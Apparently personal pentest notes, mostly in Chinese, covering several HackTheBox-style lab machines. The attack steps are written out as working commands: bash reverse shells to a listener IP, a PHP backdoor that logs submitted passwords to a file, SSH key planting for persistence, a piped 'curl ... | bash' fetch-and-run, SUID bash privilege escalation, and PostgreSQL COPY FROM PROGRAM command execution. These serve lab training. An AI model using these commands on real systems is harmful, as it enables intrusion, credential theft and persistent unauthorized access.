## Linux_Medium
### https:// ippsec.rocks 搜索关键词漏洞 
### https://crackstation.net 解编码

#### 通过Web的404可以知道web的框架；如Flask为python;flask-unsign是用来解析Flask应用的签名cookie的
```
Google搜索：0xdf 404 templates

https://0xdf.gitlab.io/cheatsheets/404
```
```
在这种 Flask 轻量项目里，最常见几种是：  
方式	      典型文件
SQLite:	  db.sqlite3, database.db
JSON存储	: db.json, users.json, data.json
YAML:     config.yaml
```
#### tcpwrapped 是：端口 被访问控制保护；可能只允许 本机访问 (127.0.0.1)
#### 子域名爆破
```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
```

<details>
<summary>反弹</summary>
	
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'


python3 -c 'import pty;pty.spawn("/bin/bash")'
web@Imagery:~/web$ ^Z
[1]+  Stopped                 nc -lvnp 9011
[★]$ stty raw -echo;fg
nc -lvnp 9011
             export TERM=xterm

[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
```
</details>

#### env
```
[★]$ python3 -m venv .venv
[★]$ source .venv/bin/activate
```

#### Form Watcher
<details>
<summary>rsa_id; index.php后门</summary>

```
// Backdoor 手动插入后门好酷
	  $file = fopen("creds.txt", "a+");
 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n"); //$_POST['name'] 表单用户名
 	header("Location: http://127.0.0.1/index.php");
 	fclose($file);	  

//关于私钥
zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh //-p:如果父目录不存在就一起创建
zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N "" //-N ""空密码
zabbix@watcher:/var/lib/zabbix$ cd .ssh
zabbix@watcher:/var/lib/zabbix/.ssh$ ls
id_rsa	id_rsa.pub
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys //把 公钥写入授权列表
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
[★]$ vi id_rs
[★]$ chmod 600 id_rsa //-rw-------
[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
```
</details>

#### Form Bamboo
<details>
<summary>Web_squid代理端口</summary>

```
端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口

[1] 设置代理[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf //需注释掉：#socks4 	127.0.0.1 9050

[2]用 curl 测试 HTTP 的命令 ｜ 你 → Squid代理(3128) → 内网端口9191
[★]$ proxychains4 curl -v http://10.129.238.16:9191

[3] burpsuite代理访问 127.0.0.1:9191/user 
$ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
Destination host    *
Proxy host          10.129.238.16
Proxu port          3128
要关掉拦截 Proxy → Intercept → Intercept is off ！！！！

linpeas 是一个自动化的本地 Linux 枚举脚本 //找路径
[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash

在burpsuite代理登录 http://127.0.0.1:9191/app?service=page/SetupCompleted 即可绕过登录

pspy :无 root 权限也能监控系统进程的工具
[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers -> Refresh servers

[★]$ nc -lvnp 5544
$ script /dev/null -c /bin/bash
bash-5.1$ cd tmp
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
bash-5.1$ /bin/bash -p
bash-5.1# id
```
</details>

#### psql数据库 From Slonik
<details>
<summary>postgres</summary>

```
所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
showmount -e将列出NFS上可用的挂载点（份额）：
[★]$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *

[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash

service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history

service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf

//数据库 postgres
[★]$ ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
[★]$ psql -h /tmp -U postgres
postgres=# \du
postgres=# \c
postgres=# \l
postgres=# \c service
service=# \dt
service=# select * from users;

service=# CREATE TABLE cmd(output text); 
service=# COPY cmd FROM  PROGRAM 'id'; 
COPY 1
service=# select * from cmd; 
service=# COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
COPY 0
service=# COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';
COPY 0

[~][★]$ ssh-keygen -t ed25519 //本地生成公钥
[~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
```
</details>

#### Kubernetes = K8s From Giveback
